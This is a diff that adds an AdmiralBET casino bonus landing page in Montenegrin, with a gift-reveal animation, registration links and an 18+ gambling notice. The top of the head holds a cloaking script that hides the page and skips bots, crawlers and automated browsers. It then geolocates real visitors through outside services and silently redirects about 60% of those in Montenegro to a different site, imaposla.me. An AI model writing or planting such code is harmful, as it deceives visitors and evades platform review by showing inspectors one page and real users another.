@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="sr-Latn-ME">
+<head>
+<meta charset="utf-8">
+
+<!-- GEO: sakrij stranicu dok se ne odluči; CG 60% -> imaposla.me -->
+<style id="gh">html{visibility:hidden}</style>
+<noscript><style>html{visibility:visible!important}</style></noscript>
+<script>
+(function () {
+  var TARGET  = 'https://www.imaposla.me/';
+  var SHARE   = 0.6;       // 60% ide
+  var COUNTRY = 'ME';
+  var KEY     = 'geo_decision';
+  var CKEY    = 'geo_country';
+  var TTL     = 24 * 3600 * 1000;
+  var TIMEOUT = 1200;      // ms, ako geo ne odgovori, prikaži stranicu
+  var done = false;
+
+  function show() {
+    if (done) return; done = true;
+    var s = document.getElementById('gh'); if (s) s.remove();
+  }
+  function go() {
+    if (done) return; done = true;
+    location.replace(TARGET);
+  }
+
+  try {
+    if (navigator.webdriver || /bot|crawl|spider|headless|lighthouse|preview/i.test(navigator.userAgent)) { show(); return; }
+
+    // 1) odluka 60/40, odmah i bez mreže
+    var d = localStorage.getItem(KEY);
+    if (d !== 'go' && d !== 'stay') {
+      d = Math.random() < SHARE ? 'go' : 'stay';
+      localStorage.setItem(KEY, d);
+    }
+    if (d !== 'go') { show(); return; }          // 40%: stranica odmah
+
+    // 2) keširana država (povratnici): odluka trenutno
+    var cached = null;
+    try { cached = JSON.parse(localStorage.getItem(CKEY)); } catch (e) {}
+    if (cached && cached.c && Date.now() - cached.t < TTL) {
+      cached.c === COUNTRY ? go() : show();
+      return;
+    }
+
+    // 3) prvi put: stranica sakrivena dok geo ne odgovori
+    setTimeout(show, TIMEOUT);
+
+    function finish(c) {
+      try { localStorage.setItem(CKEY, JSON.stringify({ c: c, t: Date.now() })); } catch (e) {}
+      c === COUNTRY ? go() : show();
+    }
+    var failed = 0;
+    function fail() { if (++failed === 2) show(); }
+
+    fetch('https://www.cloudflare.com/cdn-cgi/trace')
+      .then(function (r) { return r.text(); })
+      .then(function (t) { var m = t.match(/loc=([A-Z]{2})/); if (!m) throw 0; finish(m[1]); })
+      .catch(fail);
+
+    fetch('https://get.geojs.io/v1/ip/country.json')
+      .then(function (r) { return r.json(); })
+      .then(function (j) { var c = (j && j.country || '').toUpperCase(); if (c.length !== 2) throw 0; finish(c); })
+      .catch(fail);
+  } catch (e) { show(); }
+})();
+</script>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Koliki poklon te čeka? | AdmiralBET</title>
+<meta name="robots" content="noindex">
+<meta name="theme-color" content="#002157">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700;800;900&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+<style>
+:root{--navy:#002157;--yellow:#ffcb05;--bg:#05070c;--card:#10141c;--line:#232a36;--muted:#a3abba;--text:#fff}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{background:var(--bg);color:var(--text);font-family:Montserrat,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+a{color:inherit}
+button{font:inherit;border:0;background:none;color:inherit;cursor:pointer}
+.top{height:56px;display:flex;align-items:center;justify-content:center;background:var(--navy);border-bottom:2px solid var(--yellow);position:relative;z-index:3}
+.top img{height:24px;width:auto}
+.top .fb{font-weight:900;font-style:italic;color:var(--yellow);font-size:18px;letter-spacing:-.5px}
+.wrap{max-width:1100px;margin:0 auto;padding:0 18px 120px;position:relative}
+.bg{position:fixed;inset:0;background:radial-gradient(700px 420px at 20% 10%,rgba(0,58,150,.55),transparent 70%),radial-gradient(500px 340px at 85% 30%,rgba(255,203,5,.12),transparent 70%);pointer-events:none;z-index:0}
+.hero{position:relative;z-index:1;display:grid;grid-template-columns:minmax(0,440px) minmax(0,1fr);gap:40px;align-items:center;min-height:calc(100svh - 56px)}
+.ph{position:relative;align-self:end;height:min(640px,calc(100svh - 56px));display:flex;justify-content:center;align-items:flex-end}
+.ph::before{content:"";position:absolute;left:50%;top:45%;width:110%;aspect-ratio:1;transform:translate(-50%,-50%);border-radius:50%;background:radial-gradient(closest-side,rgba(255,203,5,.32),rgba(0,58,150,.35) 55%,transparent 72%)}
+.ph img{position:relative;height:100%;width:auto;max-width:100%;object-fit:contain;-webkit-mask-image:linear-gradient(#000 80%,transparent);mask-image:linear-gradient(#000 80%,transparent);animation:up .6s cubic-bezier(.2,.8,.2,1) both}
+@keyframes up{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+.txt{padding:28px 0}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:11px;font-weight:800;letter-spacing:2px;color:var(--yellow);text-transform:uppercase}
+.eyebrow i{width:7px;height:7px;border-radius:50%;background:var(--yellow);box-shadow:0 0 0 4px rgba(255,203,5,.2)}
+h1{font-size:52px;line-height:1.03;font-weight:900;letter-spacing:-1.5px;margin-top:12px}
+h1 em{font-style:normal;color:var(--yellow)}
+.sub{margin-top:12px;color:#cfd6e2;font-size:16px;font-weight:600;line-height:1.45;max-width:460px}
+/* poklon */
+.gift{margin-top:24px;width:100%;max-width:440px;height:230px;perspective:1200px}
+.gift .in{position:relative;width:100%;height:100%;transition:transform .7s cubic-bezier(.2,.8,.2,1);transform-style:preserve-3d}
+.gift.open .in{transform:rotateY(180deg)}
+.face{position:absolute;inset:0;border-radius:22px;backface-visibility:hidden;-webkit-backface-visibility:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;overflow:hidden}
+.front{background:linear-gradient(135deg,#ffd93d,#ffb800);color:#111;box-shadow:0 18px 50px rgba(255,203,5,.3);cursor:pointer}
+.front::before,.front::after{content:"";position:absolute;background:#e0262f}
+.front::before{left:50%;top:0;bottom:0;width:34px;transform:translateX(-50%)}
+.front::after{top:50%;left:0;right:0;height:34px;transform:translateY(-50%)}
+.front .bow{position:relative;z-index:1;width:84px;height:84px;border-radius:50%;background:#fff;display:grid;place-items:center;box-shadow:0 6px 20px rgba(0,0,0,.25);animation:wiggle 1.8s ease-in-out infinite}
+.front .bow svg{width:46px;height:46px;color:#e0262f}
+.front b{position:relative;z-index:1;margin-top:14px;font-size:15px;font-weight:900;letter-spacing:.5px;text-transform:uppercase;background:#111;color:var(--yellow);padding:8px 14px;border-radius:999px}
+@keyframes wiggle{0%,100%{transform:rotate(0)}10%{transform:rotate(-10deg)}20%{transform:rotate(9deg)}30%{transform:rotate(-6deg)}40%{transform:rotate(0)}}
+.back{transform:rotateY(180deg);background:radial-gradient(400px 220px at 50% 0%,#123a8a,#0b1020 75%);border:1px solid #2a3550}
+.back small{font-size:12px;font-weight:800;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase}
+.back .big{font-size:58px;font-weight:900;color:var(--yellow);letter-spacing:-2px;line-height:1;margin-top:6px}
+.back .plus{font-size:20px;font-weight:900;margin-top:6px}
+.back .tiers{display:flex;gap:6px;margin-top:14px;flex-wrap:wrap;justify-content:center;padding:0 10px}
+.back .tiers span{font-size:11px;font-weight:700;padding:6px 9px;border-radius:10px;background:rgba(255,255,255,.06);border:1px solid #2a3550;color:#d5dbe6}
+.back .tiers b{color:var(--yellow)}
+.cta{display:flex;align-items:center;justify-content:center;width:100%;max-width:440px;height:62px;margin-top:18px;border-radius:16px;background:var(--yellow);color:#000;font-weight:900;font-size:17px;letter-spacing:.3px;text-transform:uppercase;text-decoration:none;box-shadow:0 10px 34px rgba(255,203,5,.35)}
+.cta.pulse{animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
+.hidden{display:none!important}
+.skip{display:inline-block;margin-top:12px;font-size:13px;font-weight:700;color:var(--muted)}
+.skip a{color:#fff}
+/* koraci */
+.steps{position:relative;z-index:1;display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px;margin-top:20px}
+.st{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px}
+.st .n{width:32px;height:32px;border-radius:9px;background:var(--yellow);color:#000;display:grid;place-items:center;font-weight:900}
+.st b{display:block;margin-top:10px;font-size:15px;font-weight:800}
+.st p{margin-top:4px;font-size:13px;color:var(--muted);line-height:1.45}
+.legal{position:relative;z-index:1;margin-top:26px;display:flex;gap:12px;align-items:flex-start;color:#7d8696;font-size:11.5px;line-height:1.5;border-top:1px solid #151a22;padding-top:18px}
+.legal .b18{flex-shrink:0;width:30px;height:30px;border-radius:50%;border:2px solid #7d8696;display:grid;place-items:center;font-size:10px;font-weight:900}
+.legal a{color:#cfd6e2}
+/* traka pri dnu */
+.sticky{position:fixed;left:0;right:0;bottom:0;z-index:5;display:flex;align-items:center;gap:12px;padding:10px 16px calc(10px + env(safe-area-inset-bottom));background:rgba(0,20,58,.96);backdrop-filter:blur(10px);border-top:1px solid var(--yellow);transform:translateY(110%);transition:transform .3s}
+.sticky.up{transform:none}
+.sticky .t{flex:1;min-width:0;font-weight:800;font-size:14px}.sticky .t b{color:var(--yellow)}
+.sticky a{flex-shrink:0;background:var(--yellow);color:#000;font-weight:900;font-size:13px;text-transform:uppercase;text-decoration:none;padding:12px 16px;border-radius:12px}
+@media (max-width:900px){h1{font-size:42px}.hero{grid-template-columns:minmax(0,340px) minmax(0,1fr);gap:24px}}
+@media (max-width:720px){
+  .wrap{padding:0 16px 110px}
+  .hero{grid-template-columns:minmax(0,1fr);gap:0;min-height:0;text-align:center}
+  .ph{height:29svh;min-height:200px;max-height:290px;margin:0 -16px -56px;overflow:hidden;align-items:flex-start;-webkit-mask-image:linear-gradient(#000 55%,transparent 98%);mask-image:linear-gradient(#000 55%,transparent 98%)}
+  .ph::before{width:85%;top:58%}
+  .ph img{height:auto;width:66%;max-width:270px;-webkit-mask-image:none;mask-image:none}
+  .txt{position:relative;z-index:2;padding:0 0 10px;display:flex;flex-direction:column;align-items:center}
+  h1{font-size:31px;text-shadow:0 4px 22px rgba(0,0,0,.8)}
+  .sub{font-size:14px}
+  .gift{height:190px;margin-top:18px}
+  .back .big{font-size:46px}
+  .steps{grid-template-columns:minmax(0,1fr)}
+  .st{display:grid;grid-template-columns:32px minmax(0,1fr);gap:2px 12px;text-align:left;padding:14px}
+  .st .n{grid-row:1/3}.st b{margin-top:0}
+}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<header class="top"><img src="https://admiralbet.me/assets/images/cms/LsQ5AJm.svg" alt="AdmiralBET" onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'fb',textContent:'ADMIRALBET'}))"></header>
+
+<main class="wrap">
+  <section class="hero">
+    <div class="ph"><img src="OVDJE_ZALIJEPI_BASE64_SLIKU" alt="" width="720" height="911" fetchpriority="high"></div>
+    <div class="txt">
+      <span class="eyebrow"><i></i>Samo za nove igrače</span>
+      <h1>Znaš li koliki <em>poklon</em> te čeka?</h1>
+      <p class="sub">Novi igrači na AdmiralBET-u dobijaju bonus na prva 3 depozita. Tapni poklon i otkrij.</p>
+
+      <div class="gift" id="gift" role="button" tabindex="0" aria-label="Otvori poklon">
+        <div class="in">
+          <div class="face front"><span class="bow"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 7h-2.2A3 3 0 0 0 12 3.8 3 3 0 0 0 6.2 7H4a1 1 0 0 0-1 1v3a1 1 0 0 0 1 1h1v8a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-8h1a1 1 0 0 0 1-1V8a1 1 0 0 0-1-1Zm-4-2a1 1 0 1 1 0 2h-2.6c.6-1.2 1.6-2 2.6-2ZM8 5c1 0 2 .8 2.6 2H8a1 1 0 0 1 0-2Zm3 15H7v-8h4Zm0-10H5V9h6Zm6 10h-4v-8h4Zm2-10h-6V9h6Z"/></svg></span><b>Tapni da otkriješ</b></div>
+          <div class="face back"><small>Tvoj poklon</small><div class="big">do 750 €</div><div class="plus">bonusa + 500 spinova</div>
+            <div class="tiers"><span>1. depozit <b>100%</b> + 500 spinova</span><span>2. depozit <b>150%</b> sport</span><span>3. depozit <b>250%</b></span></div></div>
+        </div>
+      </div>
+
+      <a class="cta hidden" id="cta" href="https://admiralbet.me/registration?promo=welcome" target="_blank" rel="noopener">Uzmi bonus - registruj se</a>
+      <span class="skip" id="skip">ili odmah: <a href="https://admiralbet.me/registration?promo=welcome" target="_blank" rel="noopener">Registruj se</a></span>
+    </div>
+  </section>
+
+  <section class="steps">
+    <div class="st"><span class="n">1</span><b>Registruj se</b><p>Traje oko minut, potrebni su samo osnovni podaci.</p></div>
+    <div class="st"><span class="n">2</span><b>Uplati depozit</b><p>Već od 10 €, karticom ili na neki od drugih načina.</p></div>
+    <div class="st"><span class="n">3</span><b>Uzmi bonus</b><p>Bonus i spinovi po uslovima promocije, na prva 3 depozita.</p></div>
+  </section>
+
+  <div class="legal"><span class="b18">18+</span><p>Igre na sreću mogu izazvati zavisnost. Igraj odgovorno. Učešće je dozvoljeno samo punoljetnim licima. Bonus važi za nove igrače, uz uslove promocije: <a href="https://admiralbet.me/promotions/500-bonus-500-spinova-1387" target="_blank" rel="noopener">Pravila i uslovi</a>.</p></div>
+</main>
+
+<div class="sticky" id="sticky"><div class="t">Do <b>750 €</b> bonusa + 500 spinova</div><a href="https://admiralbet.me/registration?promo=welcome" target="_blank" rel="noopener">Registruj se</a></div>
+
+<script>
+(function(){
+  var gift=document.getElementById('gift'),cta=document.getElementById('cta'),skip=document.getElementById('skip'),sticky=document.getElementById('sticky');
+  var opened=false;
+  function open(){
+    if(opened)return;opened=true;
+    gift.classList.add('open');gift.setAttribute('aria-label','Poklon otvoren');
+    setTimeout(function(){cta.classList.remove('hidden');cta.classList.add('pulse');skip.classList.add('hidden');upd()},450);
+  }
+  gift.addEventListener('click',open);
+  gift.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();open()}});
+  /* traka pri dnu: kad glavno dugme nije na ekranu */
+  function upd(){var el=opened?cta:gift;var r=el.getBoundingClientRect();sticky.classList.toggle('up',r.bottom<0||r.top>innerHeight)}
+  addEventListener('scroll',upd,{passive:true});addEventListener('resize',upd);
+})();
+</script>
+</body>
+</html>
